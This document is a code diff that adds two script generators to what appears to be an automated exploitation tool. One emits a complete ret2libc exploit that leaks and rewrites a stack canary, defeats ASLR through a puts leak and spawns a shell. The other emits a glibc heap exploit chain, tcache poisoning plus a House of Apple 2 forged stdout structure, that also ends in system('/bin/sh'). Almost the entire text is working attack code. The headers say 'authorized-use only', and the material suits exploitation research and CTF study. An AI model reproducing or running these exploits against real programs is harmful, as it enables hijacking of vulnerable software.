@@ -182,6 +182,73 @@ def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> byte
     ).encode()
 
 
+def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, puts_plt, puts_got,
+                          ret_to, puts_off, system_off, binsh_off, ret_gadget=None, loop_feed=None,
+                          canary_regex=r"0x[0-9a-fA-F]+", canary_index=None) -> bytes:
+    """A self-contained, stdlib-only reproducer for a ret2libc PAST A STACK CANARY (no-PIE). The
+    canary is per-process random, so a static input cannot exist -- the script LEAKS it at runtime,
+    writes it back, does a two-stage puts leak to defeat ASLR, then system("/bin/sh"). All binary
+    offsets are static (no-PIE); the libc base is recovered live, so the script is portable."""
+    feed = loop_feed if loop_feed is not None else canary_trigger
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Lykos L3 reproducer: ret2libc past a stack canary. Authorized-use only.\n"
+        "import os, re, select, struct, subprocess, sys, time\n"
+        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
+        f"CANARY_OFF={canary_offset}; RET_OFF={ret_offset}\n"
+        f"TRIGGER={canary_trigger!r}; FEED={feed!r}\n"
+        f"POP_RDI={pop_rdi:#x}; PUTS_PLT={puts_plt:#x}; PUTS_GOT={puts_got:#x}; RET_TO={ret_to:#x}\n"
+        f"PUTS_OFF={puts_off:#x}; SYSTEM_OFF={system_off:#x}; BINSH_OFF={binsh_off:#x}\n"
+        f"RET_GADGET={ret_gadget if ret_gadget else 0:#x}; REGEX={canary_regex!r}; "
+        f"IDX={canary_index if canary_index is not None else 'None'}\n"
+        "def q(v): return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
+        "def read_until(p, deadline, quiet=0.3):\n"
+        "    out=b''; last=time.time()\n"
+        "    while time.time()<deadline:\n"
+        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
+        "        if r:\n"
+        "            c=os.read(p.stdout.fileno(),4096)\n"
+        "            if not c: break\n"
+        "            out+=c; last=time.time()\n"
+        "        elif p.poll() is not None: break\n"
+        "        elif out and (time.time()-last)>quiet: break\n"
+        "    return out\n"
+        "def find_canary(vals):\n"
+        "    for v in vals:\n"
+        "        if v&0xFF or v>>8==0 or v<0x1000000000000: continue\n"
+        "        if 0x550000000000<=v<=0x5FFFFFFFFFFF or 0x7F0000000000<=v<=0x7FFFFFFFFFFF: continue\n"
+        "        return v\n"
+        "    return None\n"
+        "def prefix(c): return b'A'*CANARY_OFF + q(c) + b'B'*max(0, RET_OFF-CANARY_OFF-8)\n"
+        "for align in ((None, RET_GADGET) if RET_GADGET else (None,)):\n"
+        "  for _ in range(3):\n"
+        "    p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "    read_until(p, time.time()+0.5)\n"
+        "    p.stdin.write(TRIGGER); p.stdin.flush()\n"
+        "    dump=read_until(p, time.time()+3)\n"
+        "    vals=[int(m.group(0),16) for m in re.finditer(REGEX.encode(),dump)]\n"
+        "    canary = vals[IDX] if (IDX is not None and -len(vals)<=IDX<len(vals)) else find_canary(vals)\n"
+        "    if canary is None: p.kill(); continue\n"
+        "    pre=prefix(canary)\n"
+        "    p.stdin.write(pre+q(POP_RDI)+q(PUTS_GOT)+q(PUTS_PLT)+q(RET_TO)); p.stdin.flush()\n"
+        "    burst=read_until(p, time.time()+3); raw=burst.split(b'\\n',1)[0][:6]\n"
+        "    if len(raw)<6: p.kill(); continue\n"
+        "    base=int.from_bytes(raw.ljust(8,b'\\x00'),'little')-PUTS_OFF\n"
+        "    if base<=0 or base&0xFFF: p.kill(); continue\n"
+        "    p.stdin.write(FEED); p.stdin.flush(); read_until(p, time.time()+0.4)\n"
+        "    s2=bytearray(pre)+(q(align) if align else b'')+q(POP_RDI)+q(base+BINSH_OFF)+q(base+SYSTEM_OFF)\n"
+        "    try:\n"
+        "        p.stdin.write(bytes(s2)); p.stdin.flush(); time.sleep(0.3)\n"
+        "        p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
+        "    except (BrokenPipeError, OSError): p.kill(); continue\n"
+        "    out=read_until(p, time.time()+6, quiet=1.5)\n"
+        "    if b'PWNED-LYKOS' in out:\n"
+        "        print('shell (canary %#x, libc base %#x):'%(canary,base)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
+        "    p.kill()\n"
+        "sys.stderr.write('canary ret2libc did not confirm\\n'); sys.exit(1)\n"
+    ).encode()
+
+
 # --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
 def _read_until(p, deadline, quiet=0.3):
     """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
@@ -600,6 +667,79 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
             best = {**cls, "trigger": trig, "dump": dump[:400]}
             break
     return best
+
+
+def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
+                       poison_size=0x300, guard_size=0x430) -> bytes:
+    """A self-contained, stdlib-only reproducer for the automated glibc-heap -> shell chain
+    (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
+    Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
+    heap page are recovered live; only the libc OFFSETS (measured at build time) are embedded. The
+    menu is driven with the same op templates the exploit used."""
+    ops = {k: (v if isinstance(v, str) else v.decode("latin-1")) for k, v in menu_ops.items()}
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Lykos L3 reproducer: glibc heap -> shell (tcache poison + House of Apple 2). Authorized-use only.\n"
+        "import os, select, struct, subprocess, sys, time\n"
+        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
+        f"OPS={ops!r}\n"
+        f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
+        f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
+        f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
+        "def render(t, idx=None, size=None, data=b''):\n"
+        "    head, sep, tail = t.partition('{data}')\n"
+        "    def sub(s):\n"
+        "        if idx is not None: s=s.replace('{idx}',str(idx))\n"
+        "        if size is not None: s=s.replace('{size}',str(size))\n"
+        "        return s.encode()\n"
+        "    out=sub(head)\n"
+        "    if sep: out+=(data if isinstance(data,(bytes,bytearray)) else str(data).encode())+sub(tail)\n"
+        "    return out\n"
+        "def ADD(i,s,d): return render(OPS['add'],i,s,d)\n"
+        "def FREE(i): return render(OPS['free'],i)\n"
+        "def VIEW(i): return render(OPS['view'],i)\n"
+        "def EDIT(i,d): return render(OPS['edit'],i,data=d)\n"
+        "EXIT=OPS['exit_seq'].encode()\n"
+        "def read_until(p, deadline, quiet=0.2):\n"
+        "    out=b''; last=time.time()\n"
+        "    while time.time()<deadline:\n"
+        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
+        "        if r:\n"
+        "            c=os.read(p.stdout.fileno(),4096)\n"
+        "            if not c: break\n"
+        "            out+=c; last=time.time()\n"
+        "        elif p.poll() is not None: break\n"
+        "        elif out and (time.time()-last)>quiet: break\n"
+        "    return out\n"
+        "def hoa2(write_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
+        "    b=bytearray(b'\\x00'*0x300)\n"
+        "    def w(o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
+        "    b[0:len(command)]=command\n"
+        "    w(0x28,1); w(0x88,write_addr+0x2a0); w(0xa0,write_addr+0xe0); w(0xd8,wfile_jumps)\n"
+        "    w(0xe0+0x30,0); w(0xe0+0xe0,write_addr+0x200); w(0x200+0x68,system)\n"
+        "    return bytes(b)\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def op(seq,secs=0.35):\n"
+        "    p.stdin.write(seq); p.stdin.flush(); return read_until(p, time.time()+secs)\n"
+        "def ptr(o): return struct.unpack('<Q', o[:8].ljust(8,b'\\x00')[:8])[0] if o else 0\n"
+        "read_until(p, time.time()+0.5)\n"
+        "op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
+        "leak=ptr(op(VIEW(0),0.5)); base=leak-UNSORTED_OFF\n"
+        "assert base>0 and base%0x1000==0, 'libc leak failed: %#x'%leak\n"
+        "stdout_addr=base+STDOUT_OFF\n"
+        "op(ADD(2,POISON,b'C')); op(ADD(3,POISON,b'D')); op(FREE(2))\n"
+        "heap=ptr(op(VIEW(2),0.5)); assert heap, 'heap leak failed'\n"
+        "op(ADD(2,POISON,b'C')); op(FREE(3)); op(FREE(2))\n"
+        "op(EDIT(2, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(4,POISON,b'E'))\n"
+        "blob=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
+        "op(ADD(5,POISON,blob[:POISON]))\n"
+        "p.stdin.write(EXIT); p.stdin.flush(); time.sleep(0.3)\n"
+        "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
+        "out=read_until(p, time.time()+8, quiet=1.5)\n"
+        "if b'PWNED-LYKOS' in out or b'uid=' in out:\n"
+        "    print('shell (libc base %#x, heap %#x):'%(base,heap)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
+        "sys.stderr.write('heap -> shell did not confirm\\n'); sys.exit(1)\n"
+    ).encode()
 
 
 # --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
